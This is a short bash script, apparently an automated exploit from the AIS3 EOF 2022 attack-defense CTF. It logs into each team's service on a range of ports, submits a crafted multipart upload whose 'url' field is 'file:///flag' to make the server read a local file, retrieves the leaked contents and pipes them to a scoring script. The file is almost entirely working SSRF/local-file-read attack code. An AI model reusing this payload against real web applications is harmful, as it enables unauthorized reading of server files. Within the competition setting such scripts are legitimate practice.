#!/bin/bash

for j in 1 `seq 18 42`
do
	i=$(( $j + 30000 ))
	flagurl=''
	flag=''
	cookie=$(mktemp)
	curl 'http://chals2.eof.ais3.org:'$i'/login' --data-raw 'username=seadog007&password=test1234' -c "$cookie" -b "$cookie" --max-time 1 && flagurl=$(curl -s -c "$cookie" -b "$cookie" 'http://chals2.eof.ais3.org:'$i'/upload' --data-raw $'------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="image"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm\r\nContent-Disposition: form-data; name="url"\r\n\r\nfile:///flag\r\n------WebKitFormBoundaryE9hwBFtBLrkMrXmm--\r\n' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE9hwBFtBLrkMrXmm' | grep -oP 'url=.+/view/\K.*?(?=")') && flag=$(curl -s 'http://chals2.eof.ais3.org:'$i'/uploads/'"$flagurl"'.jpg' ) && bash /home/eof2022/score.sh $j "$flag" | jq .
	rm $cookie
done
